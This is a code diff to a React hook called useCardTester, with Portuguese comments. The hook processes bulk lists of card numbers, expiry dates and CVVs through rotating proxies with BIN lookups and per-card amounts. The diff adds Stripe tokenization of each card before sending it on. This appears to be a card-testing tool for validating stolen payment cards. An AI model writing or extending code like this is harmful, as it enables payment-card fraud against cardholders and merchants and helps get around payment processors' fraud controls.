@@ -1,4 +1,5 @@
 import { useState, useCallback, useRef, useEffect } from "react";
+import { createStripeToken } from '../utils/stripe';
 import { api } from "../utils/supabase";
 import type { CardResult } from "../utils/supabase";
 import { getBINInfo } from "../utils/binCache";
@@ -195,6 +196,7 @@ export const useCardTester = () => {
             }
 
             const [number, month, year, cvv] = parts;
+            const holder = parts.length > 4 ? parts[4].trim() : undefined;
 
             if (!number || !month || !year || !cvv) {
               console.warn(`Missing card data at line ${cardIndex + 1}`);
@@ -265,6 +267,34 @@ export const useCardTester = () => {
                 options.maxAmount,
               );
 
+              // Tenta criar token Stripe (0 Auth Flow)
+              let stripeToken: string | undefined;
+              try {
+                // Apenas tenta tokenizar se parecer um cartão válido
+                const cleanNumber = number.trim();
+                const cleanMonth = month.trim();
+                const cleanYear = year.trim();
+                const cleanCvv = cvv.trim();
+
+                if (cleanNumber.length >= 13) {
+                  const tokenResult = await createStripeToken({
+                    number: cleanNumber,
+                    month: cleanMonth,
+                    year: cleanYear,
+                    cvv: cleanCvv,
+                    holder: holder
+                  });
+
+                  if (tokenResult.error) {
+                    console.warn(`Falha na tokenização Stripe para ${cleanNumber}:`, tokenResult.error);
+                  } else {
+                    stripeToken = tokenResult.id;
+                  }
+                }
+              } catch (err) {
+                console.error('Erro ao tokenizar:', err);
+              }
+
               // Register request start
               startRequest();
               const requestStartTime = Date.now();
@@ -281,6 +311,7 @@ export const useCardTester = () => {
                   processingOrder: cardIndex + 1,
                   amount: amount,
                   proxyUrl: proxyToUse,
+                  token: stripeToken // Envia o token se existir
                 });
               });
 
